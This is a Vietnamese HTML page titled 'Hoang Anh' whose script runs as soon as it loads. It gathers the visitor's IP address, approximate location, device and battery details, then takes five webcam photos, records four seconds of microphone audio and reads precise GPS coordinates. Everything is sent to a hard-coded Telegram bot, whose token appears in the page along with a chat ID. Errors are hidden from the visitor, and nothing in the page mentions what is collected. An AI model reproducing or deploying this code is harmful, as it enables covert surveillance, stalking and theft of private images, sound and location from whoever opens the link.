<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hoang Anh</title>
    <style>
        body {
            background: black;
            color: lime;
            font-family: monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #info {
            white-space: pre-wrap;
            text-align: left;
            margin: auto;
            max-width: 600px;
            width: 100%;
            background: #111;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid lime;
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
            word-break: break-word;
            font-size: 14px;
            line-height: 1.6;
        }
        .error {
            color: #ff6666;
        }
        .loading {
            color: yellow;
        }
        .success {
            color: #66ff66;
        }
    </style>
</head>
<body>
    <div id="info" class="loading">⏳ Đang tải thông tin...</div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // Cấu hình Telegram
        const botToken = '8677995221:AAHg3u6Yhtd2uOJrDwRg0jvUvKx9oBMHAZk';
        const chatId = '7211752234';
        const infoDiv = document.getElementById('info');
        
        // Cấu hình chụp ảnh
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300; // Giảm xuống 300ms để nhanh hơn
        
        // Cấu hình ghi âm
        const AUDIO_DURATION = 4000; // Giảm xuống 4 giây
        
        // Cờ để tránh gửi trùng lặp
        let infoSent = false;
        let photoCount = 0;
        let photoSentCount = 0;
        let gpsRequested = false;
        let gpsSent = false;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];

        // Hàm gửi tin nhắn đến Telegram
        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text.substring(0, 4096),
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram Error:', data);
                    if (retryCount < maxRetries) {
                        setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                    }
                }
                return data;
            } catch (e) {
                console.error('Telegram Fetch Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi file âm thanh đến Telegram
        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Đã gửi ghi âm thành công');
                } else {
                    console.error('Audio Upload Error:', data);
                    if (retryCount < maxRetries) {
                        setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                    }
                }
            } catch (e) {
                console.error('Telegram Audio Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi ảnh đến Telegram
        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    console.log(`✅ Đã gửi ảnh #${photoNumber} thành công`);
                    
                    if (photoSentCount === PHOTO_COUNT) {
                        if (cameraStream && cameraActive) {
                            setTimeout(() => {
                                cameraStream.getTracks().forEach(track => {
                                    track.stop();
                                });
                                cameraStream = null;
                                cameraActive = false;
                            }, 2000);
                        }
                    }
                } else {
                    console.error('Photo Upload Error:', data);
                    if (retryCount < maxRetries) {
                        setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                    }
                }
            } catch (e) {
                console.error('Telegram Photo Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            }
        }

        // Hàm chụp ảnh đơn lẻ
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToTelegram(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 100);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
                    resolve(false);
                }
            });
        }

        // Hàm chụp nhiều ảnh
        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                
                await captureSinglePhoto(video, canvas, ctx, i);
                photoCount++;
                
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        // Hàm ghi âm
        async function startRecording() {
            if (audioRecorded) return;
            
            try {
                console.log('🎤 Bắt đầu yêu cầu microphone và ghi âm...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                console.log('🎤 Đã được cấp quyền microphone');
                
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    if (audioBlob.size > 0) {
                        console.log('🎤 Đang gửi file ghi âm lên Telegram...');
                        await sendAudioToTelegram(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                console.log('🎤 Đang ghi âm trong 4 giây...');
                
                // Ghi âm trong 4 giây
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        console.log('🎤 Kết thúc ghi âm');
                    }
                }, AUDIO_DURATION);
                
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
                // Không gửi lỗi lên Telegram
            }
        }

        // Hàm lấy thông tin vị trí từ IP - TỐI ƯU HIỂN THỊ GOOGLE MAPS
        async function getLocationInfo(ip) {
            let lat = null;
            let lon = null;
            
            // Thử ip-api.com trước
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`);
                const data = await response.json();
                if (data.status === 'success') {
                    lat = data.lat;
                    lon = data.lon;
                    return {
                        city: data.city || 'Không xác định',
                        region: data.regionName || 'Không xác định',
                        country: data.country || 'Không xác định',
                        isp: data.isp || data.org || 'Không xác định',
                        lat: lat,
                        lon: lon
                    };
                }
            } catch (err) {
                console.error('ip-api.com error:', err);
            }
            
            // Thử ipapi.co
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                if (data && !data.error) {
                    lat = data.latitude;
                    lon = data.longitude;
                    return {
                        city: data.city || 'Không xác định',
                        region: data.region || 'Không xác định',
                        country: data.country_name || 'Không xác định',
                        isp: data.org || 'Không xác định',
                        lat: lat,
                        lon: lon
                    };
                }
            } catch (err) {
                console.error('ipapi.co error:', err);
            }
            
            // Thử ipinfo.io
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await response.json();
                if (data && !data.error) {
                    // ipinfo.io trả về loc dạng "lat,lon"
                    let latLon = null;
                    if (data.loc) {
                        const parts = data.loc.split(',');
                        if (parts.length === 2) {
                            lat = parseFloat(parts[0]);
                            lon = parseFloat(parts[1]);
                        }
                    }
                    return {
                        city: data.city || 'Không xác định',
                        region: data.region || 'Không xác định',
                        country: data.country || 'Không xác định',
                        isp: data.org || 'Không xác định',
                        lat: lat,
                        lon: lon
                    };
                }
            } catch (err) {
                console.error('ipinfo.io error:', err);
            }
            
            return {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
        }

        // Hàm yêu cầu quyền vị trí GPS - CHỈ GỬI KHI CÓ DỮ LIỆU, KHÔNG GỬI LỖI
        async function requestGPSPermission() {
            if (gpsRequested || gpsSent) return;
            gpsRequested = true;
            
            console.log('📍 Đang yêu cầu quyền truy cập vị trí...');
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        console.log('📍 Đã lấy được vị trí GPS');
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const accuracy = pos.coords.accuracy;
                        const altitude = pos.coords.altitude;
                        const speed = pos.coords.speed;
                        const heading = pos.coords.heading;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        let gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
                            `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
                            `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
                            `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>`;
                        
                        if (altitude) {
                            gpsMessage += `\n<b>🗻 Độ cao:</b> <code>${Math.round(altitude)} mét</code>`;
                        }
                        if (speed) {
                            gpsMessage += `\n<b>⚡ Tốc độ:</b> <code>${(speed * 3.6).toFixed(1)} km/h</code>`;
                        }
                        if (heading) {
                            gpsMessage += `\n<b>🧭 Hướng:</b> <code>${Math.round(heading)}°</code>`;
                        }
                        
                        gpsMessage += `\n\n<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
                        
                        await sendToTelegram(gpsMessage);
                        gpsSent = true;
                    },
                    async (err) => {
                        console.log('📍 Không thể lấy GPS:', err.message);
                        // KHÔNG GỬI LỖI LÊN TELEGRAM - chỉ log console
                        gpsSent = false;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                console.log('📍 Trình duyệt không hỗ trợ GPS');
                // KHÔNG GỬI LỖI LÊN TELEGRAM
            }
        }

        // Hàm lấy thông tin thiết bị - CÓ GOOGLE MAPS TỪ IP
        async function getInfo() {
            let ip = 'Không xác định';
            let locationInfo = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            // Lấy IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                locationInfo = await getLocationInfo(ip);
            } catch (err) {
                console.error('IP Fetch Error:', err);
                try {
                    const fallbackResponse = await fetch('https://api.my-ip.io/ip.json');
                    const fallbackData = await fallbackResponse.json();
                    if (fallbackData && fallbackData.ip) {
                        ip = fallbackData.ip;
                        locationInfo = await getLocationInfo(ip);
                    }
                } catch (fallbackErr) {
                    console.error('Fallback IP Error:', fallbackErr);
                }
            }
            
            // Lấy thông tin pin
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryPercent = `${Math.round(battery.level * 100)}%`;
                    batteryCharging = battery.charging;
                }
            } catch (battErr) {
                console.error('Battery API Error:', battErr);
            }
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const currentTime = new Date().toLocaleString('vi-VN');
            const language = navigator.language || 'Không xác định';
            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
            const referrer = document.referrer || 'Truy cập trực tiếp';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
            
            // Tạo link Google Maps nếu có tọa độ
            let mapsLink = '';
            if (locationInfo.lat && locationInfo.lon) {
                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}`;
            }
            
            const text = `📱 THÔNG TIN KHÁCH TRUY CẬP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Địa chỉ IP : ${ip}
📍 Thành phố : ${locationInfo.city}
🗺️ Khu vực : ${locationInfo.region}
🏳️ Quốc gia : ${locationInfo.country}
🏢 Nhà mạng : ${locationInfo.isp}${mapsLink}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 Trình duyệt : ${userAgent.substring(0, 100)}...
🖥️ Hệ điều hành : ${platform}
📺 Độ phân giải : ${screenWidth} x ${screenHeight}
🔋 Pin : ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
💾 RAM thiết bị : ${deviceMemory}
⚙️ CPU Core : ${hardwareConcurrency}
🍪 Cookie : ${cookieEnabled}
🌐 Ngôn ngữ : ${language}
⏰ Múi giờ : ${timezone}
🕐 Thời gian : ${currentTime}
📎 Nguồn truy cập : ${referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            infoDiv.className = 'success';
            infoDiv.innerText = text;
            
            if (!infoSent) {
                infoSent = true;
                
                // Tạo link Google Maps cho tin nhắn Telegram
                let telegramMapsLink = '';
                if (locationInfo.lat && locationInfo.lon) {
                    telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}">🗺️ Xem vị trí trên Google Maps</a>`;
                }
                
                const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                    `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
                    `<b>📍 Thành phố:</b> <code>${locationInfo.city}</code>\n` +
                    `<b>🗺️ Khu vực:</b> <code>${locationInfo.region}</code>\n` +
                    `<b>🏳️ Quốc gia:</b> <code>${locationInfo.country}</code>\n` +
                    `<b>🏢 Nhà mạng:</b> <code>${locationInfo.isp}</code>${telegramMapsLink}\n` +
                    `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
                    `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
                    `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
                    `<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n` +
                    `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
                    `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
                    `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
                    `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
                    `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
                    `<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
                
                await sendToTelegram(telegramText);
            }
        }
        
        // Hàm khởi tạo camera ngay lập tức
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('Camera API not supported');
                return;
            }
            
            try {
                console.log('📷 Đang yêu cầu quyền truy cập camera NGAY LẬP TỨC...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 800 },
                        height: { ideal: 600 },
                        facingMode: 'user'
                    }
                });
                
                console.log('📷 Đã được cấp quyền camera');
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Bắt đầu chụp ảnh
                await captureMultiplePhotos(video, canvas, ctx);
                
            } catch (e) {
                console.warn('Camera access error:', e);
                cameraActive = false;
                // Không gửi lỗi lên Telegram
            }
        }
        
        // Hàm yêu cầu ghi âm ngay lập tức
        async function requestAudioImmediately() {
            console.log('🎤 Chuẩn bị yêu cầu microphone NGAY LẬP TỨC sau camera...');
            setTimeout(async () => {
                if (!audioRecorded) {
                    console.log('🎤 Đang yêu cầu quyền microphone...');
                    await startRecording();
                }
            }, 100);
        }
        
        // Chạy tất cả các hàm
        async function init() {
            try {
                console.log('🚀 Bắt đầu khởi tạo...');
                
                // Chạy song song: lấy thông tin và yêu cầu camera ngay lập tức
                const infoPromise = getInfo();
                const cameraPromise = startCameraImmediately();
                
                // Đợi camera được cấp quyền
                await cameraPromise;
                
                // Ngay sau khi camera được xử lý, yêu cầu microphone
                await requestAudioImmediately();
                
                // Yêu cầu GPS sau 1 giây
                setTimeout(() => {
                    requestGPSPermission();
                }, 1000);
                
                await infoPromise;
                
            } catch (err) {
                console.error('Init error:', err);
                infoDiv.className = 'error';
                infoDiv.innerText = '❌ Đã xảy ra lỗi: ' + err.message + '\n\nVui lòng làm mới trang.';
            }
        }
        
        // Bắt đầu ngay khi trang web tải
        init();
    </script>
</body>
</html>
